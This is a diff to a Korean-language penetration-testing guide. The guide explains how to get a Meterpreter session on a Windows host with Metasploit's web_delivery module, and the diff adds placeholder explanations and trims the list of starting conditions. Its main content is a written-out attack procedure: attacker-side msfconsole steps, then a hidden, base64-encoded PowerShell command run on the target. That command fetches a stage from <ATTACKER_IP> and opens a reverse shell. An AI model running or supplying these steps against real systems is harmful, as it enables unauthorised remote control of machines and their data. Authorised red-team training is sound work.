@@ -20,12 +20,7 @@ tags:
 
 Windows 대상 호스트에서 PowerShell 명령을 실행할 수 있고 대상이 공격 호스트의 HTTP 서버와 reverse handler에 연결할 수 있으면 Metasploit `web_delivery`가 생성한 PowerShell 명령을 실행해 Meterpreter 세션을 연다.
 
-## 시작 조건 해석
-
-
-- Web Shell이나 제한된 Windows 셸에서 PowerShell 한 줄 명령은 실행할 수 있지만 Meterpreter 세션 관리 기능이 필요할 때.
-- 파일을 직접 업로드하는 대신 Metasploit이 제공하는 HTTP stage를 메모리에서 불러오려 할 때.
-- 대상 아키텍처와 callback 방향을 확인한 상태에서 reverse Meterpreter를 받을 때.
+Windows 대상에서 PowerShell 한 줄 명령을 실행할 수 있고, 대상 아키텍처와 HTTP stage·reverse callback 방향을 확인했을 때 사용한다. stage 제공 성공은 Meterpreter session 성공과 별도다.
 
 ## 전제 조건
 
@@ -39,6 +34,8 @@ Windows 대상 호스트에서 PowerShell 명령을 실행할 수 있고 대상�
 ## 실행
 
 ### Linux 공격 호스트에서 Web Delivery 준비
+
+이 block은 공격 호스트에서 실행한다. `<ATTACKER_IP>`는 HTTP stage와 reverse handler가 bind할 IP(가상 예: `192.0.2.10`), `<SRVPORT>`·`<LPORT>`는 각각 stage·handler TCP 포트(가상 예: `8080`, `4444`)다. `<WEB_DELIVERY_JOB_ID>`·`<RANDOM_PATH>`·`<GENERATED_BASE64_COMMAND>`는 이번 module output에서 얻는다.
 
 ```text
 sudo msfconsole -q
@@ -66,6 +63,8 @@ msf6 exploit(multi/script/web_delivery) > jobs -v
 
 ### Windows 대상 호스트에서 생성 명령 실행
 
+이 block은 PowerShell 명령 실행이 확인된 Windows 대상에서 실행한다. `<GENERATED_BASE64_COMMAND>`는 바로 위 module이 출력한 payload 전체를 재사용하며 임의 문자열로 바꾸지 않는다.
+
 Web Shell이나 현재 Windows 셸에 Metasploit이 출력한 명령을 그대로 입력한다.
 
 ```powershell
@@ -75,6 +74,8 @@ powershell.exe -nop -w hidden -e <GENERATED_BASE64_COMMAND>
 Metasploit이 난독화되지 않은 `IEX` 명령을 출력한 경우에도 임의로 다시 작성하지 않고 해당 실행에서 생성된 URL·명령을 사용한다.
 
 ### Linux 공격 호스트에서 새 세션 확인
+
+`<SESSION_ID>`·`<REMOTE_PAYLOAD_PID>`는 이번 `Meterpreter session ... opened`와 `getpid` 출력에서 얻는다. session 연결만으로 대상 권한 상승을 뜻하지 않는다.
 
 ```text
 msf6 > sessions -l
